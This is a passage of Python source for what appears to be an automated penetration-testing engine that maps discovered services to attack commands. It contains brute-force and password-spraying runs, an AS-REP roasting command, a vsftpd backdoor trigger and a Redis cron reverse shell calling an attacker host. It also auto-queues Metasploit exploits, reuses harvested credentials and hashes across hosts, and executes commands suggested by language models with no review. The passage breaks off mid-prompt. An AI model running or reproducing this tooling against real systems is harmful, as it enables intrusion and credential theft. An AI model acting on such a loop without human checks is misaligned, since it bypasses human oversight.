             f"ssh-audit {target} 2>/dev/null | head -30"
             f" || (nc -w3 {target} {port} 2>&1 | head -3)"),
            (12, f"SSH-UserEnum:{port}",
             f"for u in root admin user test oracle service; do "
             f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes $u@{target} 2>&1 | "
             f"grep -q 'Permission denied' && echo \"$u: valid user\" || true; done 2>/dev/null"),
        ]
        if cfg["brute_force"]:
            cmds.append((50, f"Hydra-SSH:{port}",
                f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt"
                f" -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
                f" -t 4 -o /tmp/hydra_ssh_{target}.txt {target} ssh 2>/dev/null"))
        if cfg["brute_force"] and mode == "aggressive":
            cmds.append((52, f"SSH-KeyScan:{port}",
                f"ssh-keyscan -t rsa,ecdsa,ed25519 {target} 2>/dev/null"))

    # ── FTP ───────────────────────────────────────────────────────────────────
    if port == 21 or "ftp" in svc:
        cmds += [
            (10, f"FTP-Scripts:{port}",
             f"nmap -p {port} --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor {target} 2>/dev/null"),
            (12, f"FTP-Anon-Download:{port}",
             f"timeout 15 ftp -n -v {target} <<'EOF'\nopen {target}\nuser anonymous anonymous\nls -la\nbinary\nget flag.txt /tmp/ftp_flag_{target}.txt 2>/dev/null\nget user.txt /tmp/ftp_user_{target}.txt 2>/dev/null\nquit\nEOF\n2>/dev/null; "
             f"cat /tmp/ftp_flag_{target}.txt 2>/dev/null; cat /tmp/ftp_user_{target}.txt 2>/dev/null"),
        ]
        # vsftpd 2.3.4 backdoor direct check
        if "vsftpd 2.3.4" in ver or "vsftpd_234" in ver:
            cmds.append((5, f"vsftpd-Backdoor:{port}",
                f"echo 'DIRECT EXPLOIT: vsftpd 2.3.4 backdoor' && "
                f"(echo -e 'USER user:)\\nPASS pass\\n' | nc -w3 {target} 21 2>/dev/null; "
                f"sleep 1; echo 'id' | nc -w3 {target} 6200 2>/dev/null)"))
        if cfg["brute_force"]:
            cmds.append((50, f"Hydra-FTP:{port}",
                f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt"
                f" -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
                f" -t 4 {target} ftp 2>/dev/null"))

    # ── SMB ───────────────────────────────────────────────────────────────────
    if port in (445, 139) or "smb" in svc or "netbios" in svc:
        cmds += [
            (5, f"SMB-VulnScan:{port}",
             f"nmap -p 445,139 --script='smb-vuln-ms17-010,smb-vuln-ms08-067,smb-double-pulsar-backdoor,"
             f"smb-vuln-cve2009-3103,smb-security-mode,smb2-security-mode' -sV {target} 2>/dev/null"),
            (10, f"CrackMapExec-SMB:{port}",
             f"crackmapexec smb {target} --shares --sessions --disks --loggedon-users 2>/dev/null | head -40"),
            (15, f"SMBMap:{port}",
             f"smbmap -H {target} -u '' -p '' 2>/dev/null; smbmap -H {target} -u 'guest' -p '' 2>/dev/null"),
            (20, f"Enum4linux:{port}",
             f"enum4linux -a -M -l -d {target} 2>/dev/null"),
            (22, f"SMB-NullSession:{port}",
             f"smbclient -L {target} -U '' -N 2>/dev/null | head -30; "
             f"rpcclient -U '' -N {target} -c 'enumdomusers' 2>/dev/null | head -20"),
        ]
        if cfg["brute_force"]:
            cmds.append((50, f"CrackMapExec-Spray:{port}",
                f"crackmapexec smb {target} -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt"
                f" -p /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
                f" --no-bruteforce 2>/dev/null | grep '\\[+\\]' | head -10"))

    # ── LDAP / AD ─────────────────────────────────────────────────────────────
    if port in (389, 636, 3268, 88) or "ldap" in svc or "kerberos" in svc:
        cmds += [
            (10, f"LDAP-Base:{port}",
             f"ldapsearch -x -H ldap://{target} -b '' -s base '(objectClass=*)' 2>/dev/null | head -30"),
            (12, f"LDAPDomainDump:{port}",
             f"python3 -c \""
             f"import subprocess,sys;"
             f"r=subprocess.run(['ldapsearch','-x','-H','ldap://{target}','-b','','-s','base'],capture_output=True,text=True);"
             f"nc=next((l.split(':')[1].strip() for l in r.stdout.splitlines() if 'namingContexts' in l),'DC=domain,DC=local');"
             f"print('Base DN:',nc);"
             f"r2=subprocess.run(['ldapsearch','-x','-H','ldap://{target}','-b',nc,'(objectClass=domain)','ms-DS-MachineAccountQuota','maxPwdAge'],capture_output=True,text=True);"
             f"print(r2.stdout[:600])"
             f"\" 2>/dev/null || ldapsearch -x -H ldap://{target} -b '' -s base '(objectClass=*)' 2>/dev/null | grep -i 'namingContexts\\|defaultNamingContext' | head -5"),
            (15, f"LDAP-NullBind:{port}",
             f"ldapsearch -x -H ldap://{target} -D '' -w '' -b 'DC=domain,DC=local'"
             f" '(objectClass=user)' sAMAccountName 2>/dev/null | grep sAMAccountName | head -20"),
            (20, f"Kerbrute-UserEnum:{port}",
             f"kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
             f" --dc {target} --domain local 2>/dev/null | head -30"
             f" || nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=local {target} 2>/dev/null"),
            (25, f"AS-REP-Roasting:{port}",
             f"impacket-GetNPUsers domain/ -dc-ip {target} -no-pass -usersfile"
             f" /usr/share/seclists/Usernames/top-usernames-shortlist.txt 2>/dev/null | grep '\\$krb5' | head -5"
             f" || GetNPUsers.py domain/ -dc-ip {target} -no-pass 2>/dev/null | head -20"),
            # ADCS enumeration — critical for modern AD pentests
            (28, f"Certipy-Anon:{port}",
             f"certipy find -dc-ip {target} -stdout -ns {target} 2>/dev/null | head -60"
             f" || certipy find -u 'guest@domain.local' -p '' -dc-ip {target} -stdout 2>/dev/null | head -60"),
            # Kerberos delegation enumeration
            (30, f"FindDelegation:{port}",
             f"findDelegation.py 'domain/' -dc-ip {target} -no-pass 2>/dev/null | head -25"
             f" || impacket-findDelegation 'domain/' -dc-ip {target} -no-pass 2>/dev/null | head -25"
             f" || ldapsearch -x -H ldap://{target} -b 'DC=domain,DC=local' '(userAccountControl:1.2.840.113556.1.4.803:=524288)' sAMAccountName userAccountControl 2>/dev/null | head -20"),
            # SMB signing + NTLM relay prerequisite check
            (32, f"NTLMRelay-Prereq:{port}",
             f"nmap -p 445 --script smb2-security-mode {target} 2>/dev/null | grep -i 'signing\\|required\\|enabled'; "
             f"crackmapexec smb {target} 2>/dev/null | grep -i 'signing\\|SMBv'"),
        ]

    # ── RDP ───────────────────────────────────────────────────────────────────
    if port == 3389 or "rdp" in svc or "ms-wbt" in svc:
        cmds += [
            (5, f"RDP-VulnScan:{port}",
             f"nmap -p {port} --script 'rdp-vuln-ms12-020,rdp-enum-encryption' {target} 2>/dev/null; "
             f"nuclei -u rdp://{target}:{port} -t /usr/share/nuclei-templates/cves/2019/CVE-2019-0708.yaml"
             f" -j 2>/dev/null || true"),
            (10, f"RDP-Info:{port}",
             f"nmap -p {port} --script rdp-enum-encryption,rdp-enum-encryption {target} 2>/dev/null"),
        ]
        if cfg["brute_force"]:
            cmds.append((50, f"Hydra-RDP:{port}",
                f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt"
                f" -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
                f" -t 4 rdp://{target}:{port} 2>/dev/null | head -10"))

    # ── MySQL ─────────────────────────────────────────────────────────────────
    if port == 3306 or "mysql" in svc:
        cmds += [
            (10, f"MySQL-Scripts:{port}",
             f"nmap -p {port} --script mysql-empty-password,mysql-info,mysql-databases,mysql-users"
             f" --script-args mysqluser=root {target} 2>/dev/null"),
            (12, f"MySQL-EmptyRoot:{port}",
             f"mysql -h {target} -u root --password='' -e 'show databases; select user,host,authentication_string from mysql.user;' 2>/dev/null | head -30"
             f" || mysqladmin -h {target} -u root status 2>/dev/null"),
        ]

    # ── MSSQL ─────────────────────────────────────────────────────────────────
    if port == 1433 or "ms-sql" in svc or "mssql" in svc:
        cmds += [
            (10, f"MSSQL-Scripts:{port}",
             f"nmap -p {port} --script ms-sql-info,ms-sql-empty-password,ms-sql-config"
             f" --script-args mssql.instance-all {target} 2>/dev/null"),
            (15, f"MSSQL-Auth:{port}",
             f"crackmapexec mssql {target} -u sa -p '' 2>/dev/null; "
             f"impacket-mssqlclient sa@{target} -no-pass 2>/dev/null | head -10 || true"),
        ]

    # ── PostgreSQL ────────────────────────────────────────────────────────────
    if port == 5432 or "postgresql" in svc or "postgres" in svc:
        cmds += [
            (10, f"Postgres-Scripts:{port}",
             f"nmap -p {port} --script pgsql-brute --script-args brute.firstonly=true {target} 2>/dev/null"),
            (12, f"Postgres-EmptyPass:{port}",
             f"psql -h {target} -U postgres -c '\\\\l' 2>/dev/null | head -20"
             f" || PGPASSWORD='' psql -h {target} -U postgres -c 'select version();' 2>/dev/null | head -5"),
        ]

    # ── Redis ─────────────────────────────────────────────────────────────────
    if port == 6379 or "redis" in svc:
        cmds += [
            (10, f"Redis-Info:{port}",
             f"redis-cli -h {target} -p {port} info 2>/dev/null"
             f" || (echo -e 'INFO\\r\\nQUIT\\r\\n' | nc -w3 {target} {port} 2>/dev/null | head -20)"),
            (12, f"Redis-NoAuth-Check:{port}",
             f"redis-cli -h {target} -p {port} config get dir 2>/dev/null"
             f" && echo 'REDIS_NO_AUTH_CONFIRMED' || true"),
            (15, f"Redis-RCE-Cron:{port}",
             f"redis-cli -h {target} -p {port} config get dir 2>/dev/null | head -4; "
             f"echo 'INFO: If no-auth, RCE via: redis-cli config set dir /var/spool/cron && config set dbfilename root && set x \"\\\\n\\\\n* * * * * bash -i >&/dev/tcp/LHOST/4444 0>&1\\\\n\\\\n\" && save'"),
        ]

    # ── MongoDB ───────────────────────────────────────────────────────────────
    if port == 27017 or "mongo" in svc:
        cmds += [
            (10, f"MongoDB-Scripts:{port}",
             f"nmap -p {port} --script mongodb-info,mongodb-databases {target} 2>/dev/null"),
            (12, f"MongoDB-NoAuth:{port}",
             f"mongo --host {target} --port {port} --eval 'db.adminCommand({{listDatabases:1}})' 2>/dev/null | head -20"
             f" || mongosh --host {target} --port {port} --eval 'show dbs' 2>/dev/null | head -10"),
        ]

    # ── SNMP ──────────────────────────────────────────────────────────────────
    if port == 161 or "snmp" in svc:
        cmds += [
            (10, f"SNMP-Check:{port}",
             f"onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {target} 2>/dev/null | head -20"),
            (15, f"SNMP-Walk:{port}",
             f"snmpwalk -v2c -c public {target} 2>/dev/null | head -100; "
             f"snmpwalk -v1 -c private {target} 2>/dev/null | head -20"),
        ]

    # ── NFS ───────────────────────────────────────────────────────────────────
    if port == 2049 or "nfs" in svc:
        cmds += [
            (10, f"NFS-Shares:{port}",
             f"showmount -e {target} 2>/dev/null; "
             f"nmap -p {port} --script nfs-ls,nfs-statfs,nfs-showmount {target} 2>/dev/null"),
        ]

    # ── SMTP ──────────────────────────────────────────────────────────────────
    if port in (25, 587, 465) or "smtp" in svc:
        cmds += [
            (10, f"SMTP-Scripts:{port}",
             f"nmap -p {port} --script smtp-enum-users,smtp-commands,smtp-open-relay"
             f" --script-args smtp-enum-users.userlist=/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
             f" {target} 2>/dev/null"),
            (15, f"SMTP-VRFY:{port}",
             f"for u in root admin user postmaster; do "
             f"echo 'VRFY '$u | nc -w2 {target} {port} 2>/dev/null | grep '252\\|250'; done"),
        ]

    # ── DNS ───────────────────────────────────────────────────────────────────
    if port == 53 or "domain" in svc:
        cmds += [
            (10, f"DNS-ZoneTransfer:{port}",
             f"dnsrecon -n {target} -t axfr 2>/dev/null | head -30"
             f" || dig axfr @{target} 2>/dev/null | head -30"),
            (15, f"DNS-Info:{port}",
             f"nmap -p {port} --script dns-recursion,dns-zone-transfer,dns-service-discovery {target} 2>/dev/null"),
        ]

    # ── VNC ───────────────────────────────────────────────────────────────────
    if port in (5900, 5901, 5902) or "vnc" in svc:
        cmds += [
            (10, f"VNC-Scripts:{port}",
             f"nmap -p {port} --script vnc-info,vnc-brute --script-args brute.firstonly=true {target} 2>/dev/null"),
            (12, f"VNC-NoAuth:{port}",
             f"nmap -p {port} --script vnc-info {target} 2>/dev/null | grep -i 'Authentication\\|None'"),
        ]

    # ── WinRM ─────────────────────────────────────────────────────────────────
    if port in (5985, 5986) or "winrm" in svc or "wsman" in svc:
        cmds += [
            (10, f"WinRM-Check:{port}",
             f"crackmapexec winrm {target} 2>/dev/null | head -10; "
             f"nmap -p {port} --script http-auth-finder {target} 2>/dev/null"),
        ]
        if cfg["brute_force"]:
            cmds.append((50, f"WinRM-Spray:{port}",
                f"crackmapexec winrm {target}"
                f" -u /usr/share/seclists/Usernames/top-usernames-shortlist.txt"
                f" -p /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
                f" 2>/dev/null | grep '\\[+\\]' | head -10"))

    # ── Telnet ────────────────────────────────────────────────────────────────
    if port == 23 or "telnet" in svc:
        cmds += [
            (10, f"Telnet-Banner:{port}",
             f"timeout 5 telnet {target} {port} 2>&1 | head -10 || true"),
            (50, f"Hydra-Telnet:{port}",
             f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt"
             f" -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"
             f" -t 4 telnet://{target}:{port} 2>/dev/null | head -10") if cfg["brute_force"] else None,
        ]
        cmds = [c for c in cmds if c]

    # ── IIS / Exchange ────────────────────────────────────────────────────────
    if "iis" in ver or "exchange" in ver or "owa" in ver:
        scheme = "https" if port in (443, 8443) else "http"
        url2 = f"{scheme}://{target}:{port}"
        cmds += [
            (8, f"IIS-WebDAV:{port}",
             f"nmap -p {port} --script http-webdav-scan,http-iis-webdav-vuln {target} 2>/dev/null"),
            (9, f"Exchange-ProxyLogon:{port}",
             f"curl -s -k --max-time 10 '{url2}/owa/auth/logon.aspx' 2>/dev/null | grep -i 'version\\|build' | head -3; "
             f"nuclei -u {url2} -t /usr/share/nuclei-templates/cves/2021/ -j 2>/dev/null || true"),
        ]

    return cmds


AUTOPILOT_ENGINES: dict = {}
AUTOPILOT_LOCK = threading.Lock()


class AutonomousEngine:
    def __init__(self, project_id, targets, mode="normal", ollama_model="llama3", living_report_interval=300,
                 lhost="", lport="4444"):
        self.project_id = project_id
        self.targets = targets
        self.mode = mode
        self.ollama_model = ollama_model
        self.living_report_interval = living_report_interval
        self.lhost = lhost or self._detect_lhost()
        self.lport = str(lport)

        self._running = False
        self._thread = None
        self._brain_log: list = []
        self._brain_log_lock = threading.Lock()
        self._job_queue: queue.PriorityQueue = queue.PriorityQueue()
        self._completed_jobs: list = []
        self._started_at = None
        self.stats = {"commands_run": 0, "creds_found": 0, "ports_discovered": 0, "loot_items": 0, "findings_count": 0}
        self._known_services: dict = {}
        self._queued: dict = {}
        self.timeline: list = []
        self.heatmap: dict = {}
        self._cred_map: dict = {}
        self._pivot_targets: set = set()
        self._all_scanned: set = set()
        self._project_lock = threading.Lock()
        self._admin_creds: dict = {}
        self._domain: str = ""
        self._worker_threads: list = []
        self._gtfo_done: set = set()
        self._cred_reuse_tried: set = set()

    @staticmethod
    def _detect_lhost():
        """Auto-detect the attacker IP (tun0 for VPN, then eth0, then any non-loopback)."""
        try:
            import socket as _sock
            for iface_name in ("tun0", "tap0", "eth0", "ens33", "ens3", "wlan0"):
                try:
                    import fcntl, struct
                    s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
                    ip = _sock.inet_ntoa(fcntl.ioctl(
                        s.fileno(), 0x8915,
                        struct.pack('256s', iface_name[:15].encode())
                    )[20:24])
                    if ip and not ip.startswith("127."):
                        return ip
                except Exception:
                    continue
            # Fallback: connect to determine outbound IP
            with _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "YOUR_LHOST"

    def _log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {msg}"
        with self._brain_log_lock:
            self._brain_log.append(line)
            if len(self._brain_log) > 2000:
                self._brain_log = self._brain_log[-1500:]

    def _enqueue(self, priority, name, command, target):
        if target not in self._queued:
            self._queued[target] = set()
        if name in self._queued[target]:
            return False
        self._queued[target].add(name)
        self._job_queue.put((priority, time.time(), {"name": name, "command": command, "target": target}))
        return True

    def _run_sync(self, name, command, target, timeout=None):
        job_id = str(uuid.uuid4())
        job = {
            "id": job_id, "project_id": self.project_id,
            "tool": f"[AP] {name}", "phase": "autopilot",
            "command": command, "status": "running", "output": [],
            "started_at": datetime.now().isoformat(), "finished_at": None,
            "pid": None, "return_code": None, "proc": None, "autopilot": True,
        }
        with JOBS_LOCK:
            JOBS[job_id] = job
        start_iso = datetime.now().isoformat()
        _kill_timer = None
        try:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
            job["proc"] = proc; job["pid"] = proc.pid

            if timeout:
                def _kill_on_timeout():
                    try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    except: pass
                    self._log(f"TIMEOUT [{target}] {name} (>{timeout}s) — terminando")
                _kill_timer = threading.Timer(timeout, _kill_on_timeout)
                _kill_timer.start()

            for line in proc.stdout:
                job["output"].append(line.rstrip("\n"))
                if not self._running:
                    try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                    except: pass
                    break
            proc.wait(); job["return_code"] = proc.returncode
            if job["status"] == "running":
                job["status"] = "completed" if proc.returncode == 0 else "error"
        except Exception as e:
            job["output"].append(f"[ERROR] {e}"); job["status"] = "error"
        finally:
            if _kill_timer:
                _kill_timer.cancel()
            job["finished_at"] = datetime.now().isoformat(); job.pop("proc", None)

        end_iso = datetime.now().isoformat()
        output_text = "\n".join(job["output"])
        self.timeline.append({"name": name, "target": target, "start": start_iso, "end": end_iso, "status": job["status"]})
        self.stats["commands_run"] += 1
        return output_text, job_id

    def _save_parsed(self, output, target, tool_name):
        parsed = _parse_tool_output(tool_name, output, target, tool_name)
        with self._project_lock:
            return self._save_parsed_locked(parsed, output, target, tool_name)

    def _save_parsed_locked(self, parsed, output, target, tool_name):
        project = read_project(self.project_id)
        if not project:
            return parsed, []

        new_creds = []
        existing_loot = project.get("loot", [])
        seen_loot = {i.get("value") for i in existing_loot}
        added = 0
        for item in parsed.get("loot", []):
            if item["value"] not in seen_loot:
                item["timestamp"] = datetime.now().isoformat()
                existing_loot.append(item)
                seen_loot.add(item["value"])
                added += 1
                if item.get("type") == "credential":
                    new_creds.append(item["value"])
        project["loot"] = existing_loot
        self.stats["loot_items"] += added

        existing_ports = project.get("ports", [])
        seen_keys = {(p.get("host",""), p.get("port"), p.get("proto")) for p in existing_ports}
        for p in parsed.get("open_ports", []):
            key = (target, p["port"], p.get("proto", "tcp"))
            if key not in seen_keys:
                existing_ports.append({"host": target, "port": p["port"], "proto": p.get("proto","tcp"),
                    "service": p["service"], "version": p["version"], "timestamp": datetime.now().isoformat()})
                seen_keys.add(key)
        project["ports"] = existing_ports

        existing_findings = project.get("findings", [])
        seen_titles = {f.get("title", "") for f in existing_findings}
        new_vuln_count = 0
        new_exploitable = []
        now_iso = datetime.now().isoformat()
        vars_dict = {"lhost": self.lhost, "lport": self.lport}
        for f in parsed.get("findings", []):
            title = f.get("title", "")
            if title and title not in seen_titles:
                f["created_at"] = now_iso
                _enrich_finding_cvss(f)
                _auto_mitre_tag(f)
                _attach_msf_command(f, target, vars_dict)
                existing_findings.append(f)
                seen_titles.add(title)
                new_vuln_count += 1
                if f.get("exploit_cmd") and f.get("severity") in ("critical", "high"):
                    new_exploitable.append(f)
        project["findings"] = existing_findings

        write_project(project)
        if added:
            self._log(f"LOOT [{target}] +{added} items ({len(new_creds)} credenciales)")
        if new_vuln_count:
            self.stats["findings_count"] += new_vuln_count
            self._log(f"FOUND [{target}] +{new_vuln_count} vulnerabilidad(es) detectada(s)")

        # Auto-queue exploits for new exploitable findings
        for f in new_exploitable:
            exploit_cmd = f.get("exploit_cmd", "")
            title = f.get("title", "")
            key = f"AutoExploit:{re.sub(r'[^a-z0-9]', '_', title.lower())[:35]}"
            if "use exploit/" in exploit_cmd or "use auxiliary/" in exploit_cmd:
                safe_cmd = exploit_cmd.replace("'", '"')
                if self._enqueue(4, key, f"msfconsole -q -x '{safe_cmd}; exit' 2>/dev/null", target):
                    self._log(f"EXPLOIT [{target}] Auto-enqueuing: {title[:60]}")
            elif any(t in exploit_cmd for t in ("redis-cli", "nc -w", "ftp -n")):
                if self._enqueue(4, key, exploit_cmd, target):
                    self._log(f"EXPLOIT [{target}] Auto-enqueuing (direct): {title[:60]}")

        return parsed, new_creds

    def _update_attack_path(self, target, open_ports):
        project = read_project(self.project_id)
        if not project:
            return
        ap = project.get("attack_path", {"nodes": [], "edges": []})
        existing_ids = {n["id"] for n in ap["nodes"]}
        if "attacker" not in existing_ids:
            ap["nodes"].append({"id": "attacker", "label": "Attacker", "color": "#3fb950", "shape": "box"})
        if target not in existing_ids:
            ap["nodes"].append({"id": target, "label": target, "color": "#f0883e", "shape": "ellipse"})
            ap["edges"].append({"from": "attacker", "to": target, "label": "scan"})
            existing_ids.add(target)
        for p in open_ports:
            svc_id = f"{target}:{p['port']}"
            if svc_id not in existing_ids:
                color = "#f85149" if p["port"] in (445, 22, 3389, 21, 3306, 1433) else "#58a6ff"
                ap["nodes"].append({"id": svc_id, "label": f"{p['service']}\n:{p['port']}", "color": color, "shape": "box"})
                ap["edges"].append({"from": target, "to": svc_id, "label": str(p["port"])})
                existing_ids.add(svc_id)
        project["attack_path"] = ap
        write_project(project)

    def _update_heatmap(self, target, open_ports):
        HIGH_RISK = {21, 22, 23, 445, 3389, 1433, 3306, 5432, 27017, 6379, 5900}
        if target not in self.heatmap:
            self.heatmap[target] = {}
        for p in open_ports:
            risk = 3 if p["port"] in HIGH_RISK else (2 if p["port"] in (80, 443, 8080) else 1)
            self.heatmap[target][f"{p['service']}:{p['port']}"] = risk

    def _initial_scan(self, target):
        self._all_scanned.add(target)
        prev = MEMORY.recall_host(target)
        if prev:
            self._log(f"SCAN [{target}] Memoria: {len(prev)} puertos conocidos — re-scanning para actualizar")

        cfg = MODE_CONFIG.get(self.mode, MODE_CONFIG["normal"])
        # -sC: default scripts (banners, auth, etc.) -O: OS detection
        cmd = (f"nmap -sV -sC -O -{cfg['nmap_timing']} {cfg['nmap_extra']} --open"
               f" --script-timeout 30s {target} 2>/dev/null")
        self._log(f"SCAN [{target}] Iniciando scan con scripts ({self.mode})")
        output, _ = self._run_sync(f"Nmap-Initial:{target}", cmd, target)
        parsed = _parse_tool_output("nmap", output, target)
        open_ports = parsed.get("open_ports", [])

        HIGH_RISK_PORTS = {21, 22, 23, 445, 3389, 1433, 3306, 5432, 27017, 6379, 5900, 2049}
        if open_ports:
            self._log(f"PORTS [{target}] {len(open_ports)} puertos: {', '.join(str(p['port']) for p in open_ports[:10])}")
            self._known_services[target] = [(p["port"], p["service"], p["version"]) for p in open_ports]
            self.stats["ports_discovered"] += len(open_ports)
            self._save_parsed(output, target, "nmap")
            self._update_attack_path(target, open_ports)
            self._update_heatmap(target, open_ports)

            # Apply VERSION_CVE_MAP immediately against discovered ports
            self._enrich_from_ports(target, open_ports)

            # Queue nmap vuln scan against discovered ports (high priority)
            port_str = ",".join(str(p["port"]) for p in open_ports)
            self._enqueue(3, f"Nmap-VulnScan:{target}",
                f"nmap -p {port_str} --script='vuln and not dos' --script-timeout 45s"
                f" -sV {target} 2>/dev/null", target)

            for p in open_ports:
                risk = 3 if p["port"] in HIGH_RISK_PORTS else (2 if p["port"] in (80, 443, 8080) else 1)
                MEMORY.remember_host(target, p["port"], p["service"], p["version"], risk)
                for item in _kb_commands(p["port"], p["service"], p["version"], target, self.mode):
                    pri, name, cmd2 = item
                    if self._enqueue(pri, name, cmd2, target):
                        self._log(f"QUEUE [{target}] {name}")
                # Auto-exploit for versioned services (normal + aggressive)
                if p.get("version") and self.mode in ("normal", "aggressive"):
                    self._auto_exploit(target, p["port"], p["service"], p["version"])
        else:
            self._log(f"INFO [{target}] Sin puertos abiertos detectados")
        return open_ports

    def _enrich_from_ports(self, target, open_ports):
        """Apply VERSION_CVE_MAP against just-discovered ports and save as findings."""
        with self._project_lock:
            project = read_project(self.project_id)
            if not project:
                return
            existing_titles = {f.get("title", "") for f in project.get("findings", [])}
            new_f = []
            now_iso = datetime.now().isoformat()
            for p in open_ports:
                f = _match_version_cve(p, target)
                if f and f["title"] not in existing_titles:
                    f["created_at"] = now_iso
                    existing_titles.add(f["title"])
                    new_f.append(f)
            if new_f:
                project.setdefault("findings", []).extend(new_f)
                write_project(project)
        if new_f:
            for f in new_f:
                self._log(f"FOUND [{target}] VERSION-CVE: {f['title']} ({f['severity'].upper()})")

    def _credential_reuse(self, creds, source_target, ntlm_hashes=None):
        all_targets = list(self._known_services.keys()) or [source_target]
        tried = getattr(self, '_cred_reuse_tried', set())
        self._cred_reuse_tried = tried

        for cred in creds[:8]:
            if ":" not in cred:
                continue
            user, pwd = cred.split(":", 1)
            self._log(f"CRED-REUSE [{user}] probando en {len(all_targets)} targets")
            MEMORY.remember_cred(source_target, "found", user, pwd)

            for t in all_targets:
                combo_key = f"{t}:{user}:{pwd[:8]}"
                if combo_key in tried:
                    continue
                tried.add(combo_key)
                ports_set = {p for p, s, v in self._known_services.get(t, [])}

                if 22 in ports_set:
                    key = f"{t}:{user}"
                    self._cred_map[key] = pwd
                    self._enqueue(5, f"CredReuse-SSH:{t}:{user}",
                        f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no"
                        f" -o ConnectTimeout=5 {user}@{t} 'id && hostname' 2>/dev/null", t)
                if 445 in ports_set:
                    self._enqueue(5, f"CredReuse-SMB:{t}:{user}",
                        f"crackmapexec smb {t} -u '{user}' -p '{pwd}' 2>/dev/null", t)
                if 5985 in ports_set or 5986 in ports_set:
                    self._enqueue(5, f"CredReuse-WinRM:{t}:{user}",
                        f"crackmapexec winrm {t} -u '{user}' -p '{pwd}' 2>/dev/null", t)
                if 3389 in ports_set:
                    self._enqueue(6, f"CredReuse-RDP:{t}:{user}",
                        f"xfreerdp /v:{t} /u:'{user}' /p:'{pwd}' /cert-ignore /auth-only 2>/dev/null"
                        f" | grep -i 'success\\|failed\\|error' | head -3", t)
                if 21 in ports_set:
                    self._enqueue(6, f"CredReuse-FTP:{t}:{user}",
                        f"curl -s --max-time 8 ftp://{user}:{pwd}@{t}/ 2>/dev/null | head -10 && echo FTP_LOGIN_OK", t)
                if 3306 in ports_set:
                    self._enqueue(6, f"CredReuse-MySQL:{t}:{user}",
                        f"mysql -h {t} -u '{user}' -p'{pwd}' --connect-timeout=5 -e 'show databases;' 2>/dev/null | head -10", t)
                if 1433 in ports_set:
                    self._enqueue(6, f"CredReuse-MSSQL:{t}:{user}",
                        f"crackmapexec mssql {t} -u '{user}' -p '{pwd}' 2>/dev/null | head -5", t)
                if 5432 in ports_set:
                    self._enqueue(6, f"CredReuse-PgSQL:{t}:{user}",
                        f"PGPASSWORD='{pwd}' psql -h {t} -U '{user}' -c '\\l' 2>/dev/null | head -10", t)

        # Pass-the-Hash for any collected NTLM hashes
        for ntlm in (ntlm_hashes or [])[:5]:
            for t in all_targets:
                ports_set = {p for p, s, v in self._known_services.get(t, [])}
                pth_user = self._admin_creds.get(t, {}).get("user", "Administrator")
                pth_key = f"PTH:{t}:{ntlm[:8]}"
                if pth_key in tried:
                    continue
                tried.add(pth_key)
                if 445 in ports_set:
                    self._enqueue(4, f"PTH-SMB:{t}:{pth_user}",
                        f"crackmapexec smb {t} -u '{pth_user}' -H '{ntlm}' 2>/dev/null", t)
                if 5985 in ports_set or 5986 in ports_set:
                    self._enqueue(4, f"PTH-WinRM:{t}:{pth_user}",
                        f"crackmapexec winrm {t} -u '{pth_user}' -H '{ntlm}' 2>/dev/null", t)

    def _ask_ollama(self, output_text, target):
        try:
            import urllib.request as _req
            prompt = (f"Eres un pentester experto. Output contra {target}:\n\n{output_text[:2000]}\n\n"
                      "Lista 2-3 comandos exactos y ejecutables para el siguiente paso. SOLO comandos, uno por línea, sin explicación:")
            body = json.dumps({"model": self.ollama_model, "prompt": prompt, "stream": False,
                               "options": {"temperature": 0.2, "num_predict": 250}}).encode()
            req = _req.Request("http://localhost:11434/api/generate", data=body,
                               headers={"Content-Type": "application/json"}, method="POST")
            with _req.urlopen(req, timeout=25) as resp:
                ai_text = json.loads(resp.read()).get("response", "")
            if ai_text:
                self._log(f"AI [{target}] Ollama: {ai_text[:80].strip()}...")
                for line in ai_text.split("\n"):
                    line = line.strip().lstrip("0123456789.-) ")
                    if line and " " in line and len(line) > 8 and not line.startswith("#"):
                        cmd = line.replace("TARGET", target).replace("<target>", target)
                        self._enqueue(35, f"AI:{line[:40]}", cmd, target)
        except Exception:
            pass

    def _ask_claude(self, output_text, target, context_summary=""):
        """Use Claude to decide next pentesting steps based on tool output."""
        import os
        import urllib.request as _req
        api_key = os.environ.get("ANTHROPIC_API_KEY", "")
        if not api_key:
            return
        known_ports = ", ".join(
            f"{p}({s})" for p, s, v in self._known_services.get(target, [])[:15]
        )
        system_prompt = (
            "Eres un pentester experto analizando output de herramientas de seguridad. "
            "Tu trabajo es decidir los siguientes pasos de ataque. "
            "Responde ÚNICAMENTE con JSON válido, sin markdown ni explicación adicional."
        )
        user_prompt = (
            f"Target: {target}\n"
            f"Puertos conocidos: {known_ports or 'desconocidos'}\n"
            f"Contexto previo: {context_summary[:500] if context_summary else 'ninguno'}\n\n"
            f"Output de herramienta:\n{output_text[:3000]}\n\n"
